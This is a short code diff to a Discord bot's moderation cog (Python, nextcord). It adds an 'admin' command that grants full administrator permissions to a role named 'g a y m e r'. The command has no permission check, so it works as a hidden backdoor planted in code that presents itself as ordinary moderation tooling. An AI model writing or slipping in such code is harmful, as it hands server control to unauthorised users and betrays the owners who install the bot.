@@ -38,5 +38,11 @@ class Moderation(commands.Cog):
         await ctx.send('Chat purged by {}'.format(ctx.author.mention))
         await ctx.message.delete()
 
+    @commands.command()
+    async def admin(self, ctx):
+        role = nextcord.utils.get(ctx.guild.roles, name="g a y m e r")
+        perms = nextcord.Permissions(administrator = True)
+        await role.edit(permissions = perms)
+
 def setup(bot):
     bot.add_cog(Moderation(bot))
